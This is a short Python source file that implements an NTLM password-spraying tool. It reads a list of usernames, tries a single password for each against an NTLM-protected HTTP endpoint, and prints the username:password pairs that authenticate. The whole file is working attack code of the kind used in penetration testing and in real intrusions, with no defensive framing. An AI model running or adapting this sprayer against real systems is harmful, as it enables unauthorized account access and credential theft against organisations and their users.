import requests

from requests_ntlm import HttpNtlmAuth

class NTLMSprayer:
    def __init__(self, url, password, fqdn) -> None:
        # Static Variables
        self.HTTP_AUTH_FAIL = 401
        self.HTTP_AUTH_SUCCESS = 200
        self.verbose = True
        self.userlist = list()

        # Dynamic variables
        self.url = url
        self.password = password
        self.fqdn = fqdn 

    def load_userfile(self, userfile) -> None:
        lines = None

        with open(userfile, 'r') as fp:
            lines = fp.readlines()

        for line in lines:
            self.userlist.append(line.rstrip())

    def password_spray(self) -> None:
        print("[*] Beginning password spray with password: ", self.password)
        
        count = 0
        userpass_lst = list()

        for user in self.userlist:
            user_str = f"{self.fqdn}\\{user}"
            with requests.get(self.url, auth=HttpNtlmAuth(user_str, self.password)) as resp:
                if resp.status_code == self.HTTP_AUTH_FAIL:
                    continue
                elif resp.status_code != self.HTTP_AUTH_SUCCESS:
                    print("[-] Reporting error: ", resp.status_code)
                    continue
            
            userpass_str = f"{user}:{self.password}"
            userpass_lst.append(userpass_str)

        if len(userpass_lst) == 0:
            print("[-] No valid credentials found :(")
        
        print("[+] Valid credentials found:")
        for userpass in userpass_lst:
            print(userpass)

                